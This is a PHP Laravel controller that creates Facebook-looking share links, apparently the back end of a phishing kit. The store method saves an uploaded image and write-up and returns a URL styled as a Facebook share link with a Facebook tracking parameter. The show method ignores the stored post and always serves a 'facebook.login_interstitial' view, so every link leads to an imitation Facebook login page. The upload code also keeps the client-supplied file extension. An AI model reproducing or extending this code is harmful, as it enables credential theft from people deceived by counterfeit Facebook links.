<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Illuminate\Support\Str;
use Illuminate\Support\Facades\URL;
use App\Models\SharedPost;

class FacebookShareController extends Controller
{
    public function create()
    {
        $history = SharedPost::orderBy('created_at', 'desc')->take(10)->get();
        return view('admin.create_share', compact('history'));
    }

    public function store(Request $request)
    {
        $request->validate([
            'image' => 'required|image',
            'writeup' => 'required|string',
        ]);
        $image = $request->file('image');
        $imageName = uniqid('share_') . '.' . $image->getClientOriginalExtension();
        $image->move(public_path('shared_images'), $imageName);
        $imagePath = 'shared_images/' . $imageName;
        $token = Str::random(10);
        $post = SharedPost::create([
            'image' => $imagePath,
            'writeup' => $request->writeup,
            'token' => $token,
        ]);
        $link = URL::to("/facebook/share/r/{$token}") . '?mibextid=wwXIfr';
        return view('admin.share_link', compact('link'));
    }

    public function show($token)
    {
        // Always show the login interstitial view
        return response()->view('facebook.login_interstitial');
    }

    public function destroy($id)
    {
        $post = SharedPost::findOrFail($id);
        $post->delete();
        return redirect()->back()->with('status', 'Share deleted successfully.');
    }
}
